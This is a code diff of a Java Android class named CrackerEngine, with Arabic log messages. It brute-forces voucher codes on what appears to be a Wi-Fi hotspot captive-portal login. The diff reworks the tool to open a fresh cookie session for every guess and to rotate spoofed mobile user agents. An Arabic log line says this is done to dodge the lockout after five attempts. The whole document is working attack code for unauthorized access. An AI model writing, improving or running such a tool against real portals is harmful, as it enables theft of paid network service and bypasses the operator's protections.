@@ -19,33 +19,29 @@ public class CrackerEngine {
     private final String network;
     private final String loginUrl, statusUrl, baseUrl;
     private final String prefix, suffix;
-    private final int digits, maxAttempts, threads;
-    private final int delayMin, delayMax, batchSize, batchRest, retryDelay;
+    private final int digits, maxAttempts, pauseMs, retryDelay;
 
     private final AtomicBoolean stopped = new AtomicBoolean(false);
     private final AtomicBoolean found = new AtomicBoolean(false);
     private final AtomicInteger done = new AtomicInteger(0);
     private final Set<String> tried;
     private final Random rng = new Random();
-    private Map<String, String> formTemplate;
-    
-    // قائمة لحفظ الخيوط لكي نتمكن من إيقافها فوراً
-    private final List<Thread> workerThreads = new ArrayList<>();
+    private Thread workerThread;
 
     public CrackerEngine(Listener l, SharedPreferences p, String network,
                          String loginUrl, String prefix, String suffix, int digits,
-                         int maxAttempts, int threads, int delayMin, int delayMax,
-                         int batchSize, int batchRest, int retryDelay) {
+                         int maxAttempts, int pauseMs, int retryDelay) {
         this.listener = l; this.prefs = p; this.network = network;
         this.loginUrl = loginUrl;
-        try { this.baseUrl = new URL(loginUrl).getProtocol() + "://" + new URL(loginUrl).getHost(); }
-        catch (Exception e) { throw new RuntimeException("bad url"); }
+        try {
+            this.baseUrl = new URL(loginUrl).getProtocol() + "://" + new URL(loginUrl).getHost();
+        } catch (Exception e) { throw new RuntimeException("bad url"); }
         this.statusUrl = baseUrl + "/status?var=callBack";
         this.prefix = prefix != null ? prefix : "";
         this.suffix = suffix != null ? suffix : "";
-        this.digits = digits; this.maxAttempts = maxAttempts; this.threads = threads;
-        this.delayMin = Math.max(150, delayMin); this.delayMax = Math.max(this.delayMin + 100, delayMax);
-        this.batchSize = batchSize; this.batchRest = batchRest; this.retryDelay = retryDelay;
+        this.digits = digits; this.maxAttempts = maxAttempts;
+        this.pauseMs = Math.max(200, pauseMs);
+        this.retryDelay = retryDelay;
         this.tried = Collections.synchronizedSet(loadTried());
     }
 
@@ -58,228 +54,194 @@ public class CrackerEngine {
         return s;
     }
 
-    public void stop() { 
+    public void stop() {
         stopped.set(true);
-        // إجبار جميع الخيوط على التوقف فوراً
-        synchronized (workerThreads) {
-            for (Thread t : workerThreads) {
-                if (t != null) t.interrupt();
-            }
-        }
+        if (workerThread != null) workerThread.interrupt();
     }
 
     public void start() {
-        new Thread(this::runEngine, "CrackerMain").start();
+        workerThread = new Thread(this::runEngine, "CrackerMain");
+        workerThread.start();
     }
 
     private void runEngine() {
         try {
-            log("▶ بدء المحرك (جلسات مستقلة)");
-            log("  URL: " + loginUrl);
+            log("▶ بدء التخمين — جلسة جديدة لكل محاولة");
+            log("  (هذا يتجنب الحظر بعد 5 محاولات)");
 
-            log("→ استخراج حقول الفورم...");
-            formTemplate = extractForm();
-            if (formTemplate == null) { log("❌ فشل استخراج الفورم"); return; }
-            log("✓ الحقول: " + formTemplate.keySet());
+            log("→ تسجيل خروج لبدء نظيف...");
+            try {
+                HttpURLConnection c = (HttpURLConnection) new URL(baseUrl + "/logout?erase-cookie=yes&var=callBack").openConnection();
+                c.setConnectTimeout(3000); c.setReadTimeout(3000);
+                c.getResponseCode();
+                c.disconnect();
+            } catch (Exception e) {}
+            sleep(1500);
 
-            if (stopped.get()) return;
-            log("→ فحص الجلسة الحالية...");
-            if (checkInitSession()) return;
+            log("  أرقام مجربة سابقاً: " + tried.size());
 
-            synchronized (workerThreads) {
-                workerThreads.clear();
-                for (int i = 0; i < threads; i++) {
-                    final int wid = i;
-                    Thread w = new Thread(() -> workerRun(wid), "Worker-" + wid);
-                    workerThreads.add(w);
-                    w.start();
-                    try { Thread.sleep(300); } catch (Exception e) {}
+            int consecutiveBusy = 0;
+
+            while (!stopped.get() && !found.get() && done.get() < maxAttempts) {
+                String v = generate();
+                if (v == null) { log("⚠ نفدت الأرقام"); break; }
+                int cur = done.incrementAndGet();
+                listener.onProgress(cur, maxAttempts, v);
+                log("🔍 " + v);
+
+                Result r = tryFreshSession(v);
+                if (stopped.get() || found.get()) break;
+
+                if (r.busy) {
+                    consecutiveBusy++;
+                    log("  ⏳ الراوتر مشغول، انتظار " + (retryDelay/1000) + "s");
+                    if (consecutiveBusy >= 3) {
+                        log("  🛑 مشغول 3 مرات — انتظار أطول...");
+                        sleep(retryDelay * 2);
+                        consecutiveBusy = 0;
+                    } else {
+                        sleep(retryDelay);
+                    }
+                    continue;
                 }
-            }
-            log("✓ تم تشغيل " + threads + " عمال بجلسات مستقلة");
+                consecutiveBusy = 0;
 
-            for (Thread w : new ArrayList<>(workerThreads)) { 
-                try { w.join(); } catch (Exception e) {} 
+                if (r.error != null && !r.error.equals("stopped")) {
+                    log("  ❌ " + v + " → " + r.error);
+                }
+
+                if (r.success) {
+                    found.set(true);
+                    log("✅✅✅ وجد الكرت: " + v);
+                    listener.onFound(v, r.statusJson);
+                    return;
+                }
+
+                sleep(pauseMs);
             }
 
             if (!found.get() && !stopped.get())
-                log("❌ انتهى — " + done.get() + " محاولة بدون نتيجة");
-        } catch (Exception e) { log("❌ خطأ عام: " + e.getMessage()); }
-    }
-
-    private boolean checkInitSession() {
-        try {
-            HttpURLConnection c = (HttpURLConnection) new URL(statusUrl).openConnection();
-            c.setConnectTimeout(3000); c.setReadTimeout(3000);
-            String body = read(c.getInputStream());
-            c.disconnect();
-            JSONObject o = new JSONObject(body);
-            if (o.optString("logged_in").equalsIgnoreCase("yes")) {
-                String u = o.optString("username", "");
-                if (!u.isEmpty() && !u.equals("-") && !u.equals("N/A")) {
-                    log("ℹ كرت مسجل: " + u);
-                    log("🛑 إيقاف (يوجد جلسة نشطة).");
-                    found.set(true);
-                    stop();
-                    listener.onFound(u, body);
-                    return true;
-                }
-            }
-        } catch (Exception e) {}
-        return false;
-    }
-
-    private Map<String, String> extractForm() {
-        try {
-            HttpURLConnection c = (HttpURLConnection) new URL(loginUrl).openConnection();
-            c.setConnectTimeout(5000); c.setReadTimeout(5000);
-            c.setRequestProperty("User-Agent", ua());
-            String html = read(c.getInputStream());
-            c.disconnect();
-
-            Map<String, String> fields = new HashMap<>();
-            java.util.regex.Pattern p = java.util.regex.Pattern.compile(
-                "<input[^>]*name=[\"']([^\"']+)[\"'][^>]*(?:value=[\"']([^\"']*)[\"'])?",
-                java.util.regex.Pattern.CASE_INSENSITIVE);
-            java.util.regex.Matcher m = p.matcher(html);
-            while (m.find()) fields.put(m.group(1), m.group(2) == null ? "" : m.group(2));
-            fields.putIfAbsent("username", "");
-            fields.putIfAbsent("password", "");
-            fields.putIfAbsent("dst", baseUrl + "/");
-            fields.putIfAbsent("popup", "true");
-            return fields;
-        } catch (Exception e) { log("⚠ استخراج: " + e.getMessage()); return null; }
-    }
-
-    private void workerRun(int id) {
-        Map<String, String> cookies = new HashMap<>();
-        int sinceRest = 0;
-
-        if (!initSession(cookies)) { log("[W" + id + "] فشل بدء الجلسة"); return; }
-        log("[W" + id + "] ✓ جلسة مستقلة");
-
-        while (!stopped.get() && !found.get() && done.get() < maxAttempts) {
-            if (sinceRest >= batchSize) {
-                sinceRest = 0;
-                log("[W" + id + "] 💤 استراحة " + (batchRest/1000) + "s");
-                try { Thread.sleep(batchRest); } catch (InterruptedException e) { break; }
-                continue;
-            }
-
-            String v = generate();
-            if (v == null) break;
-            int cur = done.incrementAndGet();
-            sinceRest++;
-            listener.onProgress(cur, maxAttempts, v);
-
-            try { Thread.sleep(delayMin + rng.nextInt(delayMax - delayMin)); } 
-            catch (InterruptedException e) { break; }
-            
-            if (stopped.get() || found.get()) break;
-
-            Result r = tryLogin(cookies, v);
-            
-            if (stopped.get() || found.get()) break;
-
-            if (r.error != null) log("[W" + id + "] ❌ " + v + " → " + r.error);
-            if (r.busy) { 
-                try { Thread.sleep(retryDelay); } catch (InterruptedException e) { break; }
-                continue; 
-            }
-            if (r.success) {
-                found.set(true);
-                log("[W" + id + "] ✅✅✅ " + v);
-                listener.onFound(v, r.statusJson);
-                stop();
-                return;
-            }
+                log("❌ انتهى — " + done.get() + " محاولة");
+        } catch (Exception e) {
+            log("❌ خطأ: " + e.getMessage());
         }
     }
 
-    private boolean initSession(Map<String, String> cookies) {
-        if (stopped.get()) return false;
-        try {
-            HttpURLConnection c = (HttpURLConnection) new URL(baseUrl + "/").openConnection();
-            c.setConnectTimeout(5000); c.setReadTimeout(5000);
-            c.setRequestProperty("User-Agent", ua());
-            c.getResponseCode();
-            extractCookies(c, cookies);
-            c.disconnect();
-            return true;
-        } catch (Exception e) { return false; }
-    }
-
-    private Result tryLogin(Map<String, String> cookies, String voucher) {
+    private Result tryFreshSession(String voucher) {
         if (stopped.get()) return Result.bad("stopped");
+        Map<String, String> cookies = new HashMap<>();
+        String ua = ua();
+
         try {
-            HttpURLConnection c = (HttpURLConnection) new URL(loginUrl).openConnection();
-            c.setRequestMethod("POST");
-            c.setDoOutput(true);
-            // تقليل وقت الانتظار لكي يستجيب زر الإيقاف بسرعة
-            c.setConnectTimeout(5000); c.setReadTimeout(5000);
-            c.setInstanceFollowRedirects(false);
-            c.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
-            c.setRequestProperty("User-Agent", ua());
-            c.setRequestProperty("Referer", loginUrl);
-            String ck = cookiesStr(cookies);
-            if (!ck.isEmpty()) c.setRequestProperty("Cookie", ck);
+            // 1. صفحة البداية (كوكيز جديدة)
+            HttpURLConnection c1 = (HttpURLConnection) new URL(baseUrl + "/").openConnection();
+            c1.setConnectTimeout(5000); c1.setReadTimeout(5000);
+            c1.setRequestProperty("User-Agent", ua);
+            c1.setRequestProperty("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
+            c1.setRequestProperty("Accept-Language", "ar,en;q=0.9");
+            c1.getResponseCode();
+            extractCookies(c1, cookies);
+            c1.disconnect();
+            if (stopped.get()) return Result.bad("stopped");
+
+            // 2. الفورم
+            HttpURLConnection c2 = (HttpURLConnection) new URL(loginUrl).openConnection();
+            c2.setConnectTimeout(5000); c2.setReadTimeout(5000);
+            c2.setRequestProperty("User-Agent", ua);
+            c2.setRequestProperty("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
+            c2.setRequestProperty("Accept-Language", "ar,en;q=0.9");
+            String ck1 = cookiesStr(cookies);
+            if (!ck1.isEmpty()) c2.setRequestProperty("Cookie", ck1);
+            String html = read(c2.getInputStream());
+            extractCookies(c2, cookies);
+            c2.disconnect();
+            if (stopped.get()) return Result.bad("stopped");
+
+            Map<String, String> fields = extractFields(html);
+            if (fields == null) return Result.bad("لا يوجد form في الصفحة");
+            fields.put("username", voucher);
+            fields.put("password", "");
+
+            // 3. إرسال
+            HttpURLConnection c3 = (HttpURLConnection) new URL(loginUrl).openConnection();
+            c3.setRequestMethod("POST");
+            c3.setDoOutput(true);
+            c3.setInstanceFollowRedirects(false);
+            c3.setConnectTimeout(8000); c3.setReadTimeout(8000);
+            c3.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
+            c3.setRequestProperty("User-Agent", ua);
+            c3.setRequestProperty("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
+            c3.setRequestProperty("Accept-Language", "ar,en;q=0.9");
+            c3.setRequestProperty("Referer", loginUrl);
+            c3.setRequestProperty("Origin", baseUrl);
+            String ck2 = cookiesStr(cookies);
+            if (!ck2.isEmpty()) c3.setRequestProperty("Cookie", ck2);
 
             StringBuilder sb = new StringBuilder();
-            for (Map.Entry<String, String> e : formTemplate.entrySet()) {
+            for (Map.Entry<String, String> e : fields.entrySet()) {
                 if (sb.length() > 0) sb.append("&");
-                sb.append(URLEncoder.encode(e.getKey(), "UTF-8")).append("=").append(URLEncoder.encode(e.getValue(), "UTF-8"));
+                sb.append(URLEncoder.encode(e.getKey(), "UTF-8"))
+                  .append("=")
+                  .append(URLEncoder.encode(e.getValue(), "UTF-8"));
             }
-            sb.append("&username=").append(URLEncoder.encode(voucher, "UTF-8"));
-            sb.append("&password=");
-
-            OutputStream os = c.getOutputStream();
+            OutputStream os = c3.getOutputStream();
             os.write(sb.toString().getBytes("UTF-8"));
             os.flush(); os.close();
 
-            int code = c.getResponseCode();
-            extractCookies(c, cookies);
-
+            int code = c3.getResponseCode();
+            extractCookies(c3, cookies);
             String body = "";
             try {
-                InputStream is = (code >= 400) ? c.getErrorStream() : c.getInputStream();
+                InputStream is = (code >= 400) ? c3.getErrorStream() : c3.getInputStream();
                 if (is != null) body = read(is);
             } catch (Exception e) {}
-            c.disconnect();
-
+            c3.disconnect();
             if (stopped.get()) return Result.bad("stopped");
 
-            if (body.contains("already authorizing")) return Result.busy("already authorizing");
-            String low = body.toLowerCase();
-            if (low.contains("invalid") || low.contains("error") || low.contains("wrong") || low.contains("denied")) {
+            String lowBody = body.toLowerCase();
+            if (body.contains("already authorizing") || lowBody.contains("already authorizing")) {
+                return Result.busy("already authorizing");
+            }
+            if (lowBody.contains("invalid") || lowBody.contains("error")
+                || lowBody.contains("wrong") || lowBody.contains("denied")) {
                 String msg = extractErr(body);
-                return Result.bad(msg != null ? msg : "invalid");
+                return Result.bad(msg != null ? msg : "خاطئ");
             }
 
-            return verify(cookies, voucher);
+            // 4. تحقق
+            sleep(100);
+            HttpURLConnection c4 = (HttpURLConnection) new URL(statusUrl).openConnection();
+            c4.setConnectTimeout(5000); c4.setReadTimeout(5000);
+            c4.setRequestProperty("User-Agent", ua);
+            String ck3 = cookiesStr(cookies);
+            if (!ck3.isEmpty()) c4.setRequestProperty("Cookie", ck3);
+            String statusBody = read(c4.getInputStream());
+            c4.disconnect();
+
+            JSONObject o = new JSONObject(statusBody);
+            String li = o.optString("logged_in", "").toLowerCase();
+            String un = o.optString("username", "").trim();
+            if ((li.equals("yes") || li.equals("true") || li.equals("1")) && voucher.equals(un))
+                return Result.ok(statusBody);
+            return Result.bad(null);
+
         } catch (Exception e) {
             return Result.bad("network: " + e.getMessage());
         }
     }
 
-    private Result verify(Map<String, String> cookies, String v) {
-        if (stopped.get()) return Result.bad("stopped");
-        try {
-            Thread.sleep(80);
-            HttpURLConnection c = (HttpURLConnection) new URL(statusUrl).openConnection();
-            c.setConnectTimeout(3000); c.setReadTimeout(3000);
-            String ck = cookiesStr(cookies);
-            if (!ck.isEmpty()) c.setRequestProperty("Cookie", ck);
-            String body = read(c.getInputStream());
-            extractCookies(c, cookies);
-            c.disconnect();
-
-            JSONObject o = new JSONObject(body);
-            String li = o.optString("logged_in", "").toLowerCase();
-            String un = o.optString("username", "").trim();
-            if ((li.equals("yes") || li.equals("true") || li.equals("1")) && v.equals(un))
-                return Result.ok(body);
-            return Result.bad(null);
-        } catch (Exception e) { return Result.bad(null); }
+    private Map<String, String> extractFields(String html) {
+        Map<String, String> fields = new LinkedHashMap<>();
+        java.util.regex.Pattern p = java.util.regex.Pattern.compile(
+            "<input[^>]*name=[\"']([^\"']+)[\"'][^>]*(?:value=[\"']([^\"']*)[\"'])?",
+            java.util.regex.Pattern.CASE_INSENSITIVE);
+        java.util.regex.Matcher m = p.matcher(html);
+        while (m.find()) fields.put(m.group(1), m.group(2) == null ? "" : m.group(2));
+        if (fields.isEmpty()) return null;
+        fields.putIfAbsent("username", "");
+        fields.putIfAbsent("password", "");
+        fields.putIfAbsent("dst", baseUrl + "/");
+        return fields;
     }
 
     private static class Result {
@@ -345,9 +307,9 @@ public class CrackerEngine {
 
     private String ua() {
         String[] a = {
-            "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/118.0 Mobile Safari/537.36",
-            "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 Chrome/115.0 Mobile Safari/537.36",
-            "Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36 Chrome/110.0 Mobile Safari/537.36"
+            "Mozilla/5.0 (Linux; Android 13; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+            "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
+            "Mozilla/5.0 (Linux; Android 11; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36"
         };
         return a[rng.nextInt(a.length)];
     }
@@ -360,5 +322,6 @@ public class CrackerEngine {
         return b.toString("UTF-8");
     }
 
+    private void sleep(long ms) { try { Thread.sleep(ms); } catch (Exception e) {} }
     private void log(String m) { listener.onLog(m); }
 }
